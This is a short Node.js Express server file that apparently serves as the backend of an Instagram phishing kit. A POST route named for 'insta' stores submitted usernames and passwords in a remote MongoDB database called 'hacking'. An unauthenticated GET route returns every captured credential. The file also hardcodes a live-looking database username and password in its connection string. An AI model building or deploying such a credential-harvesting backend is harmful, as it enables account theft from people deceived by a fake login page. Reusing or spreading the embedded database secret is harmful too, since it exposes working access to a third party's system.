const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const port = 5000;

app.use(express.static('public'))
app.use(bodyParser.json());

app.use(cors({
    origin: ['http://localhost:3000'],
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    credentials: true
})); 


mongoose.connect('mongodb+srv://instasecur24:Ki1931cK@hacking.gtlu9gt.mongodb.net/?retryWrites=true&w=majority&appName=hacking',    
).then(() => {
    console.log('Connected to MongoDB');
}).catch((err) => {
    console.error('Error connecting to MongoDB:', err);
});

app.use(express.json());

const passwordSchema = new mongoose.Schema({
    user : String,
    pass : String,
});
 
const Passwordmodule = mongoose.model('Password', passwordSchema)

app.get('/get/password/data',async (req, res) => {

    try{
        const user = await Passwordmodule.find();
        res.json(user)
    } catch (error){
        console.log("Error Fetched ", error)
        res.json({Message : error})
    }

});

app.post('/post/data/password/insta', async (req, res) =>{
    const {user, pass} = req.body;
    try{
        await Passwordmodule.create({user, pass})
        res.json({Status : "OK"})
    } catch (error){
        console.log(error)
        res.json({message : error})
    }
    
})

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});

